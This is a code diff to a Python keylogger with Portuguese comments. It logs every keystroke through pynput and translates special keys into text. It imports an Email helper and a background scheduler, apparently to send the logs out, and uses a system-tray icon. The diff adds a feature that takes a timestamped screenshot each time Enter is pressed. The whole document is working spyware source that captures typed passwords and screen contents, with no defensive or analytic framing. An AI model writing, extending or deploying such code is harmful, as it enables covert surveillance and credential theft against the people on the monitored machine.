@@ -1,9 +1,11 @@
 # Import the required libraries
 from tkinter import *
-from pystray import MenuItem as item
+import pyautogui
 from PIL import Image
-from pynput.keyboard import Listener
 from Email import Email
+from datetime import datetime
+from pynput.keyboard import Listener
+from pystray import MenuItem as item
 import pystray, multiprocessing, pathlib
 from apscheduler.schedulers.background import BackgroundScheduler
 
@@ -20,6 +22,8 @@ def writeLog(key):
 
     #dicionário com as teclas a serem traduzidas
     translate_keys = {
+        "Key.ctrl": "",
+        "Key.right": "",
         "Key.space": " ",
         "Key.shift_r": "",
         "Key.shift_l": "",
@@ -27,8 +31,8 @@ def writeLog(key):
         "Key.alt": "",
         "Key.esc": "",
         "Key.cmd": "",
-        "Key.caps_lock": "KEY_CAPS_LOCK",
-        "Key.backspace": "KEY_BACKSPACE"
+        "Key.caps_lock": "[KEY_CAPS_LOCK]",
+        "Key.backspace": "[KEY_BACKSPACE]"
     }
 
     #converter a tecla pressionada para string
@@ -36,6 +40,12 @@ def writeLog(key):
 
     #remover as asplas simples que delimitam os caracteres
     keydata = keydata.replace("'", "")
+
+    if (keydata == 'Key.enter'):
+        #definir a localização do arquivo de de imagem
+        imageFileName = "{0}/images/{1}.png".format(pathlib.Path().resolve(), datetime.now())
+        screenshot = pyautogui.screenshot()
+        screenshot.save(imageFileName)
 
     for key in translate_keys:
         #key recebe a chave do dicionário translate_keys
